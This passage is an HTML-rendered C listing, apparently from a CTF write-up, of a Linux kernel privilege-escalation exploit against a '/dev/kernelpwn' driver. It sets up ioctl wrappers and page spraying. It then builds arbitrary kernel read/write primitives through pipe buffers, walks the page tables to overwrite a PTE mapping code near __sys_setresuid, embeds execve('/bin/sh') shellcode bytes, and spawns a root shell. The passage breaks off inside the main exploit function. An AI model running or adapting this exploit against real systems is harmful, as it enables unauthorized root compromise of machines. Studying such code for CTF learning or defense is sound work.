</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;banzi.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">add</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">add_only</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x77</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">add_acc</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x88</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">del</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">idx</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">edit</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">show</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">list</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">page_fds</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">pipefd</span><span class="p">[</span><span class="mi">30</span><span class="p">][</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">spray_pags</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;Spray 0x10 order-0 page&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">52</span><span class="o">*</span><span class="mi">2</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="n">page_fds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">pagealloc_pad</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">determine_spray</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;spray determine page&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">spray_pags</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define PTE_OFFSET 12
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PMD_OFFSET 21
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PUD_OFFSET 30
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PGD_OFFSET 39
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define PT_ENTRY_MASK 0b111111111UL
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define PTE_ENTRY(addr) ((addr &gt;&gt; 12) &amp; PT_ENTRY_MASK)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PMD_ENTRY(addr) ((addr &gt;&gt; 21) &amp; PT_ENTRY_MASK)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PUD_ENTRY(addr) ((addr &gt;&gt; 30) &amp; PT_ENTRY_MASK)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PGD_ENTRY(addr) ((addr &gt;&gt; 39) &amp; PT_ENTRY_MASK)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PAGE_ENTRY(addr) ((addr) &amp; PT_ENTRY_MASK)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define PAGE_ATTR_RW (1UL &lt;&lt; 1)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PAGE_ATTR_NX (1UL &lt;&lt; 63)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">const</span> <span class="kt">char</span> <span class="n">attack_data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">106</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">184</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">129</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">246</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">94</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">230</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">230</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">210</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">5</span><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">key_spray</span> <span class="o">=</span> <span class="mi">64</span><span class="o">*</span><span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">size_t</span> <span class="n">s2</span><span class="p">,</span><span class="n">tmp_idx</span><span class="p">,</span><span class="n">page_offset_base</span><span class="p">,</span><span class="n">vmemmap_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="nf">dirt</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(((</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span><span class="p">)</span> <span class="o">-</span> <span class="n">page_offset_base</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x40</span> <span class="o">+</span> <span class="n">vmemmap_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">arb_read</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="sc">&#39;\x00&#39;</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">s2</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span>  
</span></span><span class="line"><span class="cl">    <span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x000011ff00000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">s2</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="sc">&#39;\x00&#39;</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">tmp_idx</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">arb_write</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="n">write_data</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x4000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="sc">&#39;\x00&#39;</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">s2</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span><span class="n">data</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span>  
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">s2</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">data</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">tmp_idx</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">write_data</span><span class="p">,</span><span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">get_addr</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">pgd_addr</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">pte_addr</span><span class="p">,</span><span class="n">pud_addr</span><span class="p">,</span><span class="n">pmd_addr</span><span class="p">,</span><span class="n">page_addr</span><span class="p">,</span><span class="n">dst_addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">dst_addr</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span><span class="c1">// __sys_setresuid
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">arb_read</span><span class="p">(</span><span class="nf">dirt</span><span class="p">(</span><span class="n">pgd_addr</span><span class="p">),</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pud_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PGD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pud_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arb_read</span><span class="p">(</span><span class="nf">dirt</span><span class="p">(</span><span class="n">pud_addr</span><span class="p">),</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pmd_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PUD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pmd_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arb_read</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="nf">dirt</span><span class="p">(</span><span class="n">pmd_addr</span><span class="p">),</span> <span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pte_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PMD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">page_addr</span> <span class="o">=</span> <span class="n">pte_addr</span> <span class="o">+</span> <span class="mh">0x1000</span> <span class="o">*</span> <span class="nf">PTE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pte_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span><span class="c1">//==kernel_base ; + 0xeab50 == __sys_setre
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">arb_read</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="nf">dirt</span><span class="p">(</span><span class="n">pte_addr</span><span class="p">),</span> <span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">page_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PTE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">page_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">[</span><span class="nf">PTE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">=</span> <span class="mh">0x1fc000</span> <span class="o">|</span> <span class="mh">0x8000000000000867</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arb_write</span><span class="p">(</span><span class="nf">dirt</span><span class="p">(</span><span class="n">pte_addr</span><span class="p">),</span><span class="n">data</span><span class="p">,</span><span class="mh">0xff0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">get_root_shell</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">getuid</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\033</span><span class="s">[31m</span><span class="se">\033</span><span class="s">[1m[x] Failed to get the root!</span><span class="se">\033</span><span class="s">[0m&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\033</span><span class="s">[32m</span><span class="se">\033</span><span class="s">[1m[+] Successful to get the root. </span><span class="se">\033</span><span class="s">[0m&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\033</span><span class="s">[34m</span><span class="se">\033</span><span class="s">[1m[*] Execve root shell now...</span><span class="se">\033</span><span class="s">[0m&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="cm">/* to exit the process normally, instead of segmentation fault */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="n">EXIT_SUCCESS</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">exp</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">set_cpu_affinity</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">init_namespace</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/kernelpwn&#34;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x10000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="sc">&#39;a&#39;</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;init sk-buffers&#34;</span><span class="p">);</span>
